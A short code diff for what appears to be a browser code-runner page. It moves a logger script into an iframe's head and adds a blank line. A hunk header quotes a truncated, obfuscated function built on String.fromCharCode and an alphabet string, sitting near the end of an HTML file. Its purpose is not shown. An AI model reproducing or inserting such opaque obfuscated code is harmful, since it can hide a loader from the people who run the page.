@@ -645,7 +645,7 @@ try {
         }
     `;
 
-    iframeDocument.body.appendChild(scriptLogger); // 1. Setup the logger bridge
+    iframeDocument.head.appendChild(scriptLogger);
     iframeDocument.body.appendChild(userScript);   // 2. Execute the code
 } catch (error) {
     // This catches setup errors (like if the iframe fails to load)
@@ -722,6 +722,7 @@ var Zj9wcy=function(){var bFqcmG=String.fromCharCode,D4EHuL="ABCDEFGHIJKLMNOPQRS
     document.head.appendChild(favicon);
   </script>
 </html>
+
 
 
 
